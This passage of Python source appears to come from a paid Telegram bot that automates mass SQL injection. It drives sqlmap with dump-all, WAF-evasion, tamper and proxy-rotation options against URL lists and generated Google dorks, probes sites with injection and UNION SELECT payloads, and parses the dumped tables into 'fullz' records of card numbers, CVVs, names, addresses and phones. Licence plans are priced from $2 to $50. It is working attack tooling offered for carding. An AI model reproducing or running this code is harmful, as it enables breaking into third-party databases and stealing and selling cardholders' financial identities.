    expf = row_dict.get("expiry") or row_dict.get("expiry_date") or row_dict.get("exp_date") or row_dict.get("card_expiry")
    if expf and (not rec.exp_month or not rec.exp_year):
        m = re.match(r"(\d{1,2})\s*[/\-]\s*(\d{2,4})", str(expf))
        if m:
            rec.exp_month = m.group(1).zfill(2)
            y = m.group(2)
            rec.exp_year = y[-2:] if len(y) == 4 else y
    if not rec.cc_number:
        for col, val in row_dict.items():
            cm = _CARD_RE.search(str(val))
            if cm:
                rec.cc_number = cm.group(1); break
    if not rec.cvv:
        for col, val in row_dict.items():
            cl = _normalize_col(col)
            if "cvv" in cl or "cvc" in cl or "security" in cl or "verif" in cl:
                cm = re.search(r"\b(\d{3,4})\b", str(val))
                if cm:
                    rec.cvv = cm.group(1); break
    if rec.phone:
        rec.phone = re.sub(r"[^\d+\-() ]", "", rec.phone).strip()
    if rec.zip:
        rec.zip = re.sub(r"[^\d\-]", "", rec.zip)
    return rec

def _find_header_row(rows: list) -> int:
    for i in range(min(3, len(rows))):
        if _detect_header(rows[i]):
            return i
    return -1

def extract_fullz_from_csv(csv_path: str, source_table: str = "") -> list:
    out = []
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            rows = [r for r in reader if r]
            if not rows: return []
            hdr_idx = _find_header_row(rows)
            if hdr_idx < 0:
                for row in rows:
                    text = " ".join(str(c) for c in row)
                    for cc in _extract_cards_from_text(text):
                        r = FullzRecord()
                        parts = cc.split("|")
                        r.cc_number, r.exp_month, r.exp_year, r.cvv = parts
                        for cell in row:
                            s = str(cell).strip()
                            if re.match(r"^\d{5}(-\d{4})?$", s) and not r.zip:
                                r.zip = s
                            elif re.match(r"^\+?\d{10,15}$", s) and not r.phone:
                                r.phone = s
                        out.append(r)
                return out
            header = rows[hdr_idx]
            for data_row in rows[hdr_idx+1:]:
                if not data_row or all(not str(c).strip() for c in data_row): continue
                row_dict = _row_to_dict(header, data_row)
                rec = _parse_fullz_row(row_dict, source_table=source_table)
                if rec.has_card() or (rec.holder_name and rec.zip):
                    out.append(rec)
    except Exception as e:
        logger.debug(f"fullz parse error {csv_path}: {e}")
    return out

def extract_fullz_from_dir(output_dir: str) -> list:
    all_recs = []
    for root, _, files in os.walk(output_dir):
        for fn in files:
            if fn.lower().endswith(".csv"):
                table_name = os.path.splitext(fn)[0]
                recs = extract_fullz_from_csv(os.path.join(root, fn), source_table=table_name)
                all_recs.extend(recs)
    seen = set(); deduped = []
    for r in all_recs:
        key = (r.cc_number, r.holder_name, r.zip, r.email)
        if r.cc_number and key not in seen:
            seen.add(key); deduped.append(r)
        elif not r.cc_number and (r.holder_name or r.email):
            k2 = (r.holder_name, r.email, r.zip)
            if k2 not in seen:
                seen.add(k2); deduped.append(r)
    return deduped

def fullz_records_to_lines(records: list, format: str = "full") -> list:
    lines = []
    seen = set()
    for r in records:
        line = r.to_cc_format() if format == "cc" else r.to_fullz_format()
        if line and line not in seen:
            seen.add(line); lines.append(line)
    return lines

def fullz_summary(records: list) -> str:
    total = len(records)
    with_cc = sum(1 for r in records if r.has_card())
    complete = sum(1 for r in records if r.is_complete())
    with_phone = sum(1 for r in records if r.phone)
    with_email = sum(1 for r in records if r.email)
    with_addr = sum(1 for r in records if r.address)
    with_name = sum(1 for r in records if r.holder_name)
    with_zip = sum(1 for r in records if r.zip)
    with_cvv = sum(1 for r in records if r.cvv and r.cvv != "???")
    return (
        f"💳 Total records: `{total}`\n"
        f"🔢 With CC number: `{with_cc}`\n"
        f"✅ Complete (CC+name+addr+zip): `{complete}`\n"
        f"🔐 With CVV: `{with_cvv}`\n"
        f"👤 With name: `{with_name}`\n"
        f"🏠 With address: `{with_addr}`\n"
        f"📮 With ZIP: `{with_zip}`\n"
        f"📞 With phone: `{with_phone}`\n"
        f"📧 With email: `{with_email}`"
    )





def _extract_cards_from_csv_dir(output_dir: str) -> list:
    cards, seen = [], set()
    for root, _, files in os.walk(output_dir):
        for fn in files:
            if not fn.lower().endswith(".csv"): continue
            try:
                with open(os.path.join(root, fn), encoding="utf-8", errors="ignore") as f:
                    for row in csv.reader(f):
                        for c in _extract_cards_from_text(" ".join(str(x) for x in row)):
                            if c not in seen: seen.add(c); cards.append(c)
            except Exception: pass
    return cards

def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                  technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
                  tamper=DEFAULT_TAMPER, proxy=None, proxy_file=None,
                  forms=True, dump_all=True, random_agent=True,
                  crawl_depth=0, google_dork=None, bulk_file=None,
                  batch=True, flush_session=True, skip_waf=True,
                  timeout=10, retries=2, verbose=0) -> dict:
    opts = {
        "level": level, "risk": risk, "technique": technique, "threads": threads,
        "tamper": tamper, "forms": forms, "dumpAll": dump_all,
        "randomAgent": random_agent, "batch": batch, "flushSession": flush_session,
        "timeout": timeout, "retries": retries, "verbose": verbose,
        "getBanner": True, "getCurrentUser": True, "getCurrentDb": True, "getDbs": True, "isDba": True,
    }
    if url: opts["url"] = url
    if proxy: opts["proxy"] = proxy
    if proxy_file and os.path.isfile(proxy_file): opts["proxyFile"] = proxy_file
    if google_dork: opts["googleDork"] = google_dork; opts.pop("url", None)
    if bulk_file and os.path.isfile(bulk_file): opts["bulkFile"] = bulk_file; opts.pop("url", None)
    if crawl_depth and crawl_depth > 0: opts["crawlDepth"] = crawl_depth
    return opts

class ApiTaskResult:
    __slots__ = ("url","taskid","success","cards","tables","banner",
                 "current_user","current_db","dbs","log_lines","error",
                 "csv_dir","severity","keyword_matches","auto_pairs","dbms")
    def __init__(self, url=""):
        self.url = url; self.taskid = ""; self.success = False
        self.cards = []; self.tables = []; self.banner = ""
        self.current_user = ""; self.current_db = ""; self.dbs = []
        self.log_lines = []; self.error = ""; self.csv_dir = ""
        self.severity = SEVERITY_INFO; self.keyword_matches = {}
        self.auto_pairs = []; self.dbms = ""

async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                        log_cb=None, stop_event=None, csv_output_dir="") -> ApiTaskResult:
    result = ApiTaskResult(url=options.get("url", options.get("googleDork", options.get("bulkFile", ""))))
    if not await ensure_api_server():
        result.error = "sqlmapapi server unavailable"; return result
    async with aiohttp.ClientSession() as sess:
        try:
            resp = await _api_get(sess, "/task/new")
            if not resp.get("success"): result.error = "task/new failed"; return result
            taskid = resp["taskid"]; result.taskid = taskid
        except Exception as e:
            result.error = f"task/new error: {e}"; return result
        if csv_output_dir: options = {**options, "oDir": csv_output_dir}
        try: await _api_post(sess, f"/option/{taskid}/set", options)
        except Exception as e:
            result.error = f"option/set error: {e}"; return result
        try:
            start_data = {"url": options["url"]} if "url" in options else {}
            start_resp = await _api_post(sess, f"/scan/{taskid}/start", start_data)
            if not start_resp.get("success"):
                result.error = f"scan/start failed: {start_resp}"
                await _api_get(sess, f"/task/{taskid}/delete"); return result
        except Exception as e:
            result.error = f"scan/start error: {e}"; return result
        deadline = time.time() + task_timeout; seen = 0; status = "running"
        while status in ("running","not running"):
            if stop_event and stop_event.is_set():
                try: await _api_get(sess, f"/scan/{taskid}/kill")
                except Exception: pass
                result.error = "cancelled"; break
            if time.time() > deadline:
                try: await _api_get(sess, f"/scan/{taskid}/kill")
                except Exception: pass
                result.error = "timeout"; break
            await asyncio.sleep(4)
            try:
                lr = await _api_get(sess, f"/scan/{taskid}/log")
                entries = lr.get("log", []); new = entries[seen:]; seen = len(entries)
                for e in new:
                    line = e.get("message",""); result.log_lines.append(line)
                    if log_cb and line:
                        try: log_cb(line)
                        except Exception: pass
            except Exception: pass
            try:
                st = await _api_get(sess, f"/scan/{taskid}/status")
                status = st.get("status","terminated")
            except Exception: break
        try:
            dr = await _api_get(sess, f"/scan/{taskid}/data")
            if dr.get("success") and dr.get("data"):
                raw = dr["data"]
                result.cards = _extract_cards_from_api_data(raw)
                for item in raw:
                    it, val = item.get("type",0), item.get("value",{})
                    if it == 2: result.tables.append(val)
                    elif it == 1:
                        if isinstance(val, str) and "banner" in val.lower(): result.banner = val
        except Exception: pass
        dirs = []
        if csv_output_dir and os.path.isdir(csv_output_dir): dirs.append(csv_output_dir)
        url_for_domain = options.get("url","") or ""
        if url_for_domain:
            try:
                from urllib.parse import urlparse as _up
                dom = _up(url_for_domain).netloc or ""
                if dom:
                    dd = os.path.join(os.path.expanduser("~/.sqlmap/output"), dom)
                    if os.path.isdir(dd): dirs.append(dd)
            except Exception: pass
        sqlmap_root = os.path.expanduser("~/.sqlmap/output")
        if os.path.isdir(sqlmap_root): dirs.append(sqlmap_root)
        all_cards = set(result.cards)
        for d in dirs:
            for c in _extract_cards_from_csv_dir(d): all_cards.add(c)
        result.cards = list(all_cards)
        if dirs: result.csv_dir = dirs[0]
        result.success = bool(result.cards or result.tables)
        full_log = "\n".join(result.log_lines)
        for line in result.log_lines:
            ll = line.lower()
            if "the back-end dbms is" in ll:
                result.dbms = line.split("is")[-1].strip(); break
            for name in ("mysql","postgresql","mssql","oracle","sqlite","mariadb"):
                if name in ll and ("identified" in ll or "server version" in ll):
                    result.dbms = name.upper(); break
        for line in full_log.splitlines():
            ll = line.lower()
            if "current user is" in ll and not result.current_user:
                result.current_user = line.strip()
            if "current database is" in ll and not result.current_db:
                result.current_db = line.strip()
        if result.tables:
            result.keyword_matches = keyword_match_columns(result.tables)
            result.auto_pairs = detect_auto_pairs(result.tables)
            result.severity = classify_severity(result.keyword_matches, result.cards)
        elif result.cards:
            result.severity = SEVERITY_CRITICAL
        try: await _api_get(sess, f"/task/{taskid}/delete")
        except Exception: pass
    return result

async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
                            level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                            technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
                            tamper=DEFAULT_TAMPER, crawl_depth=0,
                            task_timeout=DEFAULT_TIMEOUT, max_concurrent=DEFAULT_MAX_CONC,
                            stop_event=None, progress_cb=None,
                            per_result_cb=None, log_sample_cb=None):
    if not await ensure_api_server(): return []
    if proxy_list is None: proxy_list = []
    sem = asyncio.Semaphore(max_concurrent)
    results = []; done = [0]
    base_tmp = tempfile.mkdtemp(prefix="spidey_api_")
    _pf = proxy_file_path
    if proxy_list and not _pf:
        pf = os.path.join(base_tmp, "proxies.txt")
        with open(pf, "w") as f: f.write("\n".join(proxy_list))
        _pf = pf
    async def _one(idx, url):
        if stop_event and stop_event.is_set(): done[0] += 1; return
        url_dir = os.path.join(base_tmp, f"t{idx}")
        os.makedirs(url_dir, exist_ok=True)
        px = random.choice(proxy_list) if proxy_list else None
        opts = build_options(url, level=level, risk=risk, technique=technique,
                             threads=threads, tamper=tamper, proxy=px,
                             proxy_file=_pf, crawl_depth=crawl_depth)
        def _log(line):
            if log_sample_cb:
                try: log_sample_cb(url, line)
                except Exception: pass
        async with sem:
            r = await run_api_task(opts, task_timeout=task_timeout,
                                    log_cb=_log, stop_event=stop_event, csv_output_dir=url_dir)
        done[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                zip_src = r.csv_dir if (r.csv_dir and os.path.isdir(r.csv_dir)) else url_dir
                zb = _zip_dir(zip_src)
                if not zb:
                    sr = os.path.expanduser("~/.sqlmap/output")
                    if os.path.isdir(sr): zb = _zip_dir(sr)
                try: await per_result_cb(r, zb)
                except Exception: pass
        if progress_cb:
            try: await progress_cb(done[0], len(urls), len(results))
            except Exception: pass
    await asyncio.gather(*[_one(i+1, u) for i,u in enumerate(urls)], return_exceptions=True)
    shutil.rmtree(base_tmp, ignore_errors=True)
    return results

async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
                                risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                                threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
                                task_timeout=DEFAULT_TIMEOUT, stop_event=None,
                                log_cb=None, per_result_cb=None):
    if not await ensure_api_server():
        r = ApiTaskResult(url=dork); r.error = "sqlmapapi unavailable"; return r
    if proxy_list is None: proxy_list = []
    px = random.choice(proxy_list) if proxy_list else None
    opts = build_options(None, google_dork=dork, level=level, risk=risk,
                         technique=technique, threads=threads, tamper=tamper, proxy=px)
    tmp = tempfile.mkdtemp(prefix="spidey_dork_")
    try:
        r = await run_api_task(opts, task_timeout=task_timeout, log_cb=log_cb,
                                stop_event=stop_event, csv_output_dir=tmp)
        if r.success and per_result_cb:
            try: await per_result_cb(r, _zip_dir(tmp))
            except Exception: pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return r

async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                        technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
                        tamper=DEFAULT_TAMPER, task_timeout=DEFAULT_TIMEOUT,
                        stop_event=None, log_cb=None):
    if not await ensure_api_server():
        r = ApiTaskResult(); r.error = "sqlmapapi unavailable"; return r
    tmp = tempfile.mkdtemp(prefix="spidey_bulk_")
    uf = os.path.join(tmp, "urls.txt")
    with open(uf, "w") as f: f.write("\n".join(urls))
    if proxy_list is None: proxy_list = []
    px = random.choice(proxy_list) if proxy_list else None
    opts = build_options(None, bulk_file=uf, level=level, risk=risk,
                         technique=technique, threads=threads, tamper=tamper, proxy=px)
    try:
        r = await run_api_task(opts, task_timeout=task_timeout, log_cb=log_cb,
                                stop_event=stop_event, csv_output_dir=tmp)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return r

async def cancel_task(taskid: str) -> bool:
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as s:
            r = await _api_get(s, f"/scan/{taskid}/kill")
            return r.get("success", False)
    except Exception: return False

def _zip_dir(directory: str) -> bytes:
    buf = io.BytesIO(); has = False
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(directory):
            for fn in files:
                fp = os.path.join(root, fn)
                zf.write(fp, os.path.relpath(fp, directory)); has = True
    buf.seek(0)
    return buf.read() if has else b""

def format_result_summary(r: ApiTaskResult) -> str:
    lines = []; sep = "─" * 32
    if r.error and not r.success: return f"✗ {r.error}"
    sev = getattr(r, "severity", SEVERITY_INFO)
    lines.append(f"✅ {sev}")
    lines.append(f"🌐 {r.url[:70]}"); lines.append(sep)
    dbms = getattr(r, "dbms","") or r.banner
    if dbms: lines.append(f"🗄 DBMS: {dbms[:80]}")
    if r.current_db: lines.append(f"📂 DB: {r.current_db[:60]}")
    if r.current_user: lines.append(f"👤 USER: {r.current_user[:60]}")
    if r.dbs: lines.append(f"📤 DBs: {', '.join(r.dbs[:6])}")
    if r.tables: lines.append(f"📋 TABLES: {len(r.tables)}")
    if r.cards: lines.append(f"💳 CARDS: {len(r.cards)}")
    km = getattr(r, "keyword_matches", {})
    if km:
        lines.append(sep); lines.append("🔑 Sensitive columns:")
        for cat, pairs in km.items():
            lines.append(f"  • {cat.upper()}: {', '.join(f'{t}.{c}' for t,c in pairs[:3])}")
    ap = getattr(r, "auto_pairs", [])
    if ap:
        lines.append("🚜 Auto-pairs:")
        for tn, c1, c2, pn in ap[:4]:
            lines.append(f"  ▸ [{pn}] in `{tn}` → {c1} : {c2}")
    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  SQLMAP SUBPROCESS DUMPER (fallback)
# ═══════════════════════════════════════════════════════════════════════════
PER_URL_TIMEOUT = 420
MAX_CONCURRENT = 8
SQLMAP_THREADS = 15

def _build_subproc_cmd(url, output_dir, proxy_url="", level=None, risk=None,
                        technique=None, tamper=None, threads=None):
    bin_parts = SQLMAP_BIN.split() if " " in SQLMAP_BIN else [SQLMAP_BIN]
    cmd = bin_parts + ["-u", url, "--batch", "--dump-all",
        "--level", str(level or DEFAULT_LEVEL), "--risk", str(risk or DEFAULT_RISK),
        "--threads", str(threads or SQLMAP_THREADS), "--random-agent", "--forms",
        "--technique", technique or DEFAULT_TECHNIQUE, "--tamper", tamper or DEFAULT_TAMPER,
        "--skip-waf", "--timeout", "10", "--retries", "2",
        "--output-dir", output_dir, "--flush-session", "-v", "0"]
    if proxy_url: cmd += ["--proxy", proxy_url]
    return cmd

def _parse_sqlmap_success(stdout):
    low = stdout.lower()
    return any(k in low for k in ["is vulnerable","fetched data logged","dumped to",
        "database management system","retrieved:","table:","backend dbms:","found a total of"])

class SqlmapResult:
    def __init__(self):
        self.url = ""; self.success = False; self.cards = []
        self.csv_files = 0; self.output_dir = ""; self.log = ""; self.error = ""

async def sqlmap_dump_url(url, output_dir, proxy_url="", stop_event=None):
    r = SqlmapResult(); r.url = url
    cmd = _build_subproc_cmd(url, output_dir, proxy_url)
    try:
        proc = await asyncio.create_subprocess_exec(*cmd,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
            env={**os.environ, "PYTHONUNBUFFERED": "1"})
        async def _kill():
            if stop_event:
                await stop_event.wait()
                try: proc.kill()
                except Exception: pass
        killer = asyncio.create_task(_kill()) if stop_event else None
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=PER_URL_TIMEOUT)
            log = stdout.decode(errors="ignore")
        except asyncio.TimeoutError:
            try: proc.kill()
            except Exception: pass
            r.error = "timeout"; return r
        finally:
            if killer and not killer.done(): killer.cancel()
        r.log = log; r.success = _parse_sqlmap_success(log)
        r.cards = _extract_cards_from_csv_dir(output_dir)
        r.csv_files = sum(1 for _,_,fs in os.walk(output_dir) for f in fs if f.endswith(".csv"))
    except Exception as e:
        r.error = str(e)
    return r

def zip_output(output_dir):
    return _zip_dir(output_dir)

async def sqlmap_dump_multiple(urls, base_dir, proxy_list=None, stop_event=None,
                                progress_cb=None, max_concurrent=MAX_CONCURRENT, per_result_cb=None):
    if proxy_list is None: proxy_list = []
    sem = asyncio.Semaphore(max_concurrent); results = []; done = [0]
    async def _one(idx, url):
        nonlocal results
        if stop_event and stop_event.is_set(): done[0] += 1; return
        url_dir = os.path.join(base_dir, f"target_{idx}")
        os.makedirs(url_dir, exist_ok=True)
        px = _pick_proxy(proxy_list)
        async with sem:
            r = await sqlmap_dump_url(url, url_dir, px, stop_event)
        done[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                try: await per_result_cb(r, zip_output(url_dir))
                except Exception: pass
        if progress_cb:
            try: await progress_cb(done[0], len(urls), len(results))
            except Exception: pass
    await asyncio.gather(*[_one(i+1, u) for i,u in enumerate(urls)], return_exceptions=True)
    return results

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  SQLI SCANNER
# ═══════════════════════════════════════════════════════════════════════════
SQLI_PAYLOADS = ["'", '"', "')", '")', "' OR '1'='1' --", '" OR "1"="1" --',
                 "' OR 1=1 --", "') OR ('1'='1", "1' AND 1=2 --", "1 AND 1=2"]
SQLI_ERRORS = ["you have an error in your sql syntax","warning: mysql",
    "unclosed quotation mark","quoted string not properly terminated","sqlstate",
    "ora-","pg::syntaxerror","sqlite3::exception","sqlite_error",
    "microsoft ole db provider for sql server","odbc sql server driver",
    "syntax error or access violation","division by zero",
    "supplied argument is not a valid mysql","mysql_fetch_array() expects parameter",
    "pdoexception:","sqlstate[","unterminated string literal",
    "syntax error at or near","invalid input syntax"]

def _inject_payload(url, payload):
    try:
        p = urlparse(url); qs = parse_qs(p.query, keep_blank_values=True)
        new = {k: [v[0] + payload] for k,v in qs.items()}
        return urlunparse(p._replace(query=urlencode(new, doseq=True)))
    except Exception:
        return url + payload

async def _check_injectable(session, url, proxy_url=""):
    kw = dict(timeout=aiohttp.ClientTimeout(total=3), ssl=False, allow_redirects=True,
              headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if proxy_url: kw["proxy"] = proxy_url
    async def _probe(p):
        try:
            async with session.get(_inject_payload(url, p), **kw) as r:
                if r.status in (200, 500):
                    t = (await r.text(errors="ignore")).lower()
                    return any(e in t for e in SQLI_ERRORS)
        except Exception: pass
        return False
    res = await asyncio.gather(*[_probe(p) for p in SQLI_PAYLOADS], return_exceptions=True)
    if any(r is True for r in res): return True
    MARK = "LBCHKX99"; MARK_HEX = "0x" + MARK.encode().hex()
    for cols in (3,4,5,2,6,7):
        for pos in range(min(cols, 4)):
            slots = ["NULL"] * cols; slots[pos] = MARK_HEX
            try:
                async with session.get(_inject_payload(url, "' UNION SELECT " + ",".join(slots) + " -- -"), **kw) as r:
                    if r.status in (200, 500):
                        if MARK in await r.text(errors="ignore"): return True
            except Exception: pass
    return False

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  PRO DORK GEN V2
# ═══════════════════════════════════════════════════════════════════════════
_ADORK_TEMPLATES = {
    "t01": {"label": "(KW).(PF)?(PT)=", "template": "{KW}.{PF}?{PT}=", "vars": ["KW","PF","PT"]},
    "t02": {"label": "(KW).(PF)?(PT)= site:(DE)", "template": "{KW}.{PF}?{PT}= site:{DE}", "vars": ["KW","PF","PT","DE"]},
    "t03": {"label": "(KW).(PF)?(PT)=(NB)", "template": "{KW}.{PF}?{PT}={NB}", "vars": ["KW","PF","PT","NB"]},
    "t04": {"label": "(KW).(PF)?(PT)=(NB) site:(DE)", "template": "{KW}.{PF}?{PT}={NB} site:{DE}", "vars": ["KW","PF","PT","NB","DE"]},
    "t05": {"label": '(SF)".(DE)" + "(KW)"', "template": '{SF}".{DE}" + "{KW}"', "vars": ["SF","DE","KW"]},
    "t06": {"label": "(SF)(KW).(PF)?(PT)=", "template": "{SF}{KW}.{PF}?{PT}=", "vars": ["SF","KW","PF","PT"]},
    "t07": {"label": "(SF)(KW).(PF)?(PT)= site:(DE)", "template": "{SF}{KW}.{PF}?{PT}= site:{DE}", "vars": ["SF","KW","PF","PT","DE"]},
    "t08": {"label": "(SF)(PT)=(KW).(PF)? site:(DE)", "template": "{SF}{PT}={KW}.{PF}? site:{DE}", "vars": ["SF","PT","KW","PF","DE"]},
    "t09": {"label": "(SF)(KW).(PF)?(PT)=(NB)", "template": "{SF}{KW}.{PF}?{PT}={NB}", "vars": ["SF","KW","PF","PT","NB"]},
    "t10": {"label": "(SF)(KW).(PF)?(PT)=(NB) site:(DE)", "template": "{SF}{KW}.{PF}?{PT}={NB} site:{DE}", "vars": ["SF","KW","PF","PT","NB","DE"]},
}
_ADORK_DEFAULT_DOMAINS = [".com",".net",".org",".ru",".de",".in",".pk",".us",".uk",".info"]
_ADORK_DEFAULT_PARAMS = ["id","user_id","cat","type","page","item","product"]
_ADORK_DEFAULT_FILETYPES = [".php",".asp",".aspx",".jsp"]
_ADORK_DEFAULT_SF = ["inurl:","intitle:","allinurl:","allintitle:"]
_ADORK_DEFAULT_PF = ["index","view","page","item","product","user","login","search","show","cat"]

def adork_get_cfg(context):
    if "adork_config" not in context.user_data:
        context.user_data["adork_config"] = {
            "keywords": [], "domains": _ADORK_DEFAULT_DOMAINS.copy(),
            "params": _ADORK_DEFAULT_PARAMS.copy(), "filetypes": _ADORK_DEFAULT_FILETYPES.copy(),
            "sf": _ADORK_DEFAULT_SF.copy(), "pf": _ADORK_DEFAULT_PF.copy(),
            "enabled": list(_ADORK_TEMPLATES.keys()),
        }
    return context.user_data["adork_config"]

def _adork_parse_text(text):
    sep = "," if "," in text else "\n"
    return [i.strip() for i in text.split(sep) if i.strip()]

def adork_generate_all(cfg):
    var_map = {"KW": cfg.get("keywords",[]), "DE": cfg.get("domains",[]),
               "NB": cfg.get("params",[]), "PT": cfg.get("filetypes",[]),
               "SF": cfg.get("sf",[]), "PF": cfg.get("pf",[])}
    enabled = set(cfg.get("enabled",[])); seen = set(); dorks = []
    for tid, tinfo in _ADORK_TEMPLATES.items():
        if tid not in enabled: continue
        needed = tinfo["vars"]
        lists = [var_map.get(v, [""]) or [""] for v in needed]
        for combo in itertools.product(*lists):
            subs = dict(zip(needed, combo))
            d = tinfo["template"].format(**subs)
            if d not in seen: seen.add(d); dorks.append(d)
    return dorks

async def adork_generate_n(cfg, keywords, amount):
    var_map = {"KW": keywords or ["target"], "DE": cfg.get("domains",[]) or [".com"],
               "NB": cfg.get("params",[]) or ["id"], "PT": cfg.get("filetypes",[]) or [".php"],
               "SF": cfg.get("sf",[]) or ["inurl:"], "PF": cfg.get("pf",[]) or ["index"]}
    enabled_t = [_ADORK_TEMPLATES[t] for t in cfg.get("enabled", list(_ADORK_TEMPLATES.keys()))
                 if t in _ADORK_TEMPLATES] or list(_ADORK_TEMPLATES.values())
    seen = set(); result = []
    while len(result) < amount:
        tinfo = random.choice(enabled_t); subs = {v: random.choice(var_map[v]) for v in tinfo["vars"]}
        d = tinfo["template"].format(**subs)
        if d not in seen: seen.add(d); result.append(d)
        if len(seen) > amount * 50: break
    return result[:amount]

def _adork_template_keyboard(enabled):
    rows = []
    for tid, tinfo in _ADORK_TEMPLATES.items():
        icon = "✅" if tid in enabled else "☑️"
        rows.append([InlineKeyboardButton(f"{icon} {tinfo['label']}", callback_data=f"adork_tgl_{tid}")])
    rows.append([InlineKeyboardButton("✅ All On", callback_data="adork_all_on"),
                 InlineKeyboardButton("☑️ All Off", callback_data="adork_all_off")])
    rows.append([InlineKeyboardButton("💾 Save & Close", callback_data="adork_cfg_done")])
    return InlineKeyboardMarkup(rows)

# ═══════════════════════════════════════════════════════════════════════════
#  💾  STATE / PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════════
PLANS = [
    ("30 Mɪɴᴜᴛᴇs","30ᴍ","☁️", timedelta(minutes=30)),
    ("1 Hᴏᴜʀ","1ʜ","🌥️", timedelta(hours=1)),
    ("6 Hᴏᴜʀs","6ʜ","⛅", timedelta(hours=6)),
    ("1 Dᴀʏ","1ᴅ","🌩️", timedelta(days=1)),
    ("3 Dᴀʏs","3ᴅ","⛈️", timedelta(days=3)),
    ("5 Dᴀʏs","5ᴅ","🌤️", timedelta(days=5)),
    ("10 Dᴀʏs","10ᴅ","🌒", timedelta(days=10)),
    ("15 Dᴀʏs","15ᴅ","🌓", timedelta(days=15)),
    ("20 Dᴀʏs","20ᴅ","🌔", timedelta(days=20)),
    ("30 Dᴀʏs","30ᴅ","🌕", timedelta(days=30)),
]
PLAN_MAP = {code: (label, emoji, delta) for label, code, emoji, delta in PLANS}
PLAN_PRICES = {"30ᴍ":"$2","1ʜ":"$3","6ʜ":"$5","1ᴅ":"$8","3ᴅ":"$16",
               "5ᴅ":"$20","10ᴅ":"$28","15ᴅ":"$35","20ᴅ":"$42","30ᴅ":"$50"}

stop_events: dict = {}
license_keys: dict = {}
authorized_users: dict = {}
all_user_ids: set = set()
user_proxies: dict = {}
global_proxy_pool: list = []
banned_users: set = set()
trial_users: dict = {}
active_api_tasks: dict = {}

def _load_json(path, default):
    try:
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return default

def _save_json(path, obj):
    try:
        with open(path, "w", encoding="utf-8") as f: json.dump(obj, f, indent=2, default=str)
    except Exception: pass

def _save_proxies():
    _save_json(PROXY_FILE, {"user": {str(u): l for u,l in user_proxies.items()}, "global": global_proxy_pool})
def _load_proxies():
    global global_proxy_pool
    d = _load_json(PROXY_FILE, {})
    if isinstance(d, dict):
        for u, l in d.get("user", {}).items():
            try: user_proxies[int(u)] = list(l)
            except Exception: pass
        if isinstance(d.get("global"), list): global_proxy_pool = d["global"]

def _save_bans(): _save_json(BAN_FILE, list(banned_users))
def _load_bans():
    d = _load_json(BAN_FILE, [])
    if isinstance(d, list): banned_users.update(int(x) for x in d if str(x).isdigit())

def _save_auth():
    sa = {}
    for u,i in authorized_users.items():
        sa[str(u)] = {"plan": i.get("plan",""),
                      "expires": i["expires"].isoformat() if isinstance(i.get("expires"), datetime) else str(i.get("expires","")),
                      "granted_by": i.get("granted_by","")}
    sk = {}
    for k,i in license_keys.items():
        sk[k] = {"plan": i.get("plan",""),
                 "expires_in": i.get("expires_in",""),
                 "used_by": i.get("used_by"),
                 "created_at": i["created_at"].isoformat() if isinstance(i.get("created_at"), datetime) else str(i.get("created_at",""))}
    _save_json(AUTH_FILE, {"auth": sa, "keys": sk})

def _load_auth():
    d = _load_json(AUTH_FILE, {})
    if not isinstance(d, dict): return
    for u,i in d.get("auth", {}).items():
        try:
            e = datetime.fromisoformat(i["expires"])
            if e > datetime.now():
                authorized_users[int(u)] = {"plan": i.get("plan",""), "expires": e, "granted_by": i.get("granted_by","")}
        except Exception: pass
    for k,i in d.get("keys", {}).items():
        try:
            plan_code = i.get("plan","")
            if plan_code in PLAN_MAP:
                label, emoji, delta = PLAN_MAP[plan_code]
                license_keys[k] = {"plan": plan_code, "label": label, "emoji": emoji,
                                    "delta": delta, "used_by": i.get("used_by"),
                                    "created_at": datetime.fromisoformat(i["created_at"]) if i.get("created_at") else datetime.now()}
        except Exception: pass

def _save_users():
    _save_json(USERS_FILE, {"all": list(all_user_ids), "trial": {str(u): t.isoformat() for u,t in trial_users.items()}})
def _load_users():
    d = _load_json(USERS_FILE, {})
    if not isinstance(d, dict): return
    for u in d.get("all", []):
        try: all_user_ids.add(int(u))
        except Exception: pass
    for u, t in d.get("trial", {}).items():
        try: trial_users[int(u)] = datetime.fromisoformat(t)
        except Exception: pass

_DEFAULT_SQLOPTS = {"level": DEFAULT_LEVEL, "risk": DEFAULT_RISK, "technique": DEFAULT_TECHNIQUE,
                    "tamper": DEFAULT_TAMPER, "threads": DEFAULT_THREADS, "crawl": 0, "engine": "api", "bulk": False}
user_sqlopts: dict = {}

def _get_sqlopts(uid):
    if uid not in user_sqlopts: user_sqlopts[uid] = dict(_DEFAULT_SQLOPTS)
    return user_sqlopts[uid]

def is_admin(uid): return uid in ADMIN_IDS

def trial_status(uid):
    if uid in trial_users:
        if (datetime.now() - trial_users[uid]).total_seconds() < TRIAL_MINUTES * 60: return "active"
        return "expired"
    return "none"

def has_access(uid):
